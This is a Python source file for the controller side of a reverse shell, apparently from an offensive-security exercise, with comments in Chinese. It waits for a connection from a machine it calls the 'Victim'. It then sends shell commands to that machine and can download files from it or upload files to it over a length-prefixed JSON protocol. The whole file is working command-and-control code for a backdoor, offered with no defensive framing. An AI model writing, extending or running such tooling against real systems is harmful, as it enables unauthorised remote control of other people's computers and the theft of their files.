#!/usr/bin/python3
import socket
import json
import base64
import struct

HOST_IP = "127.0.0.1"
HOST_PORT = 12345

def reliable_send(target_socket, data):
    """
    先發送 4 bytes 的資料長度表頭，再發送實際的 JSON 資料。
    """
    json_data = json.dumps(data).encode("utf-8")
    # 使用 struct 將長度打包成 4 bytes 的網路位元組序 (big-endian)
    data_len = struct.pack(">I", len(json_data))
    target_socket.sendall(data_len + json_data)

def reliable_recv(target_socket):
    """
    先讀取 4 bytes 表頭獲取長度，再精確讀取完整的資料內容。
    """
    try:
        header = target_socket.recv(4)
        if not header:
            return None
        data_len = struct.unpack(">I", header)[0]
        
        # 循環讀取直到滿足該長度
        data = bytearray()
        while len(data) < data_len:
            packet = target_socket.recv(min(data_len - len(data), 4096))
            if not packet:
                return None
            data.extend(packet)
            
        return json.loads(data.decode("utf-8"))
    except (socket.error, json.JSONDecodeError):
        return None

def start_server():
    # 使用 context manager 自動管理 socket 釋放
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST_IP, HOST_PORT))
        s.listen(1)
        print(f"[+] Server started on {HOST_IP}:{HOST_PORT}, waiting for connection...")
        
        target, ip = s.accept()
        with target:
            print(f"[+] Victim connected from: {ip}")
            
            while True:
                command = input(f"* Shell#-{ip}: ").strip()
                if not command:
                    continue
                
                reliable_send(target, command)
                
                if command == 'q':
                    break  
                
                elif command.startswith("cd ") and len(command) > 3:
                    # cd 指令由 Client 內部改變 directory，Server 端直接繼續
                    continue
                    
                elif command.startswith("download "):
                    filename = command[9:].strip()
                    result = reliable_recv(target)
                    
                    if result is None:
                        print("[!!] Connection lost or protocol error.")
                        break
                    
                    if not result.startswith("[!!]"):
                        try:
                            with open(filename, "wb") as f:
                                f.write(base64.b64decode(result.encode("ascii")))
                            print(f"[+] File '{filename}' downloaded successfully.")
                        except Exception as e:
                            print(f"[!!] Failed to write file: {e}")
                    else:
                        print(result)
                        
                elif command.startswith("upload "):
                    filename = command[7:].strip()
                    try:
                        with open(filename, "rb") as f:
                            content = f.read()
                            encoded_content = base64.b64encode(content).decode("ascii")
                            reliable_send(target, encoded_content)
                        print(f"[+] File '{filename}' uploaded successfully.")
                    except FileNotFoundError:
                        failed = f"[!!] File '{filename}' not found on server."
                        reliable_send(target, failed)
                        print(failed)
                    except Exception as e:
                        failed = f"[!!] Fail to upload: {e}"
                        reliable_send(target, failed)
                        print(failed)
                else:
                    result = reliable_recv(target)
                    if result is None:
                        print("[!!] Connection lost.")
                        break
                    print(result)

if __name__ == "__main__":
    start_server()